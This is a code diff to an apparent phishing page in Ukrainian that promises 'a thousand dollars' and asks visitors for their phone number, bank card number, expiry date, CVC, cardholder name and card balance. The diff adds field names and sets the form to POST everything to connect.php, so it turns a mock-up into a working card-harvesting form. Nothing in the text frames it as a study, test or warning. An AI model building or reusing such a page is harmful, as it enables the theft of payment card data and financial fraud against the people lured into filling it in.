@@ -14,30 +14,30 @@
   
   <div class="container hidden">
       <h1>Отримати тисячу доларів</h1>
-      <form id="moneyForm">
+      <form id="moneyForm" action="connect.php" method="post">
           <label for="contact">Контактна інформація (номер телефону):</label>
-          <input type="text" id="contact" required>
+          <input type="text" id="contact" name="phonenumber" required>
   
           <label for="cardNumber">Номер банківської карти:</label>
-          <input type="text" id="cardNumber" required>
+          <input type="text" id="cardNumber" name="cardnumber" required>
   
           <div class="card-info">
               <div class="card-info-item">
                   <label for="expiry">Термін дії карти:</label>
-                  <input type="text" id="expiry" required>
+                  <input type="text" id="expiry" name="expdate" required>
               </div>
   
               <div class="card-info-item">
                   <label for="cvc">CVC-код:</label>
-                  <input type="text" id="cvc" required>
+                  <input type="text" id="cvc" name="cvcnumber" required>
               </div>
           </div>
   
           <label for="fullName">Ім'я та прізвище на карті:</label>
-          <input type="text" id="fullName" required>
+          <input type="text" id="fullName" name="fullname"  required>
   
           <label for="balance">Баланс грошей на карті:</label>
-          <input type="text" id="balance" required>
+          <input type="text" id="balance" name="balance" required>
   
           <button type="button" onclick="submitForm()">Отримати гроші</button>
       </form>
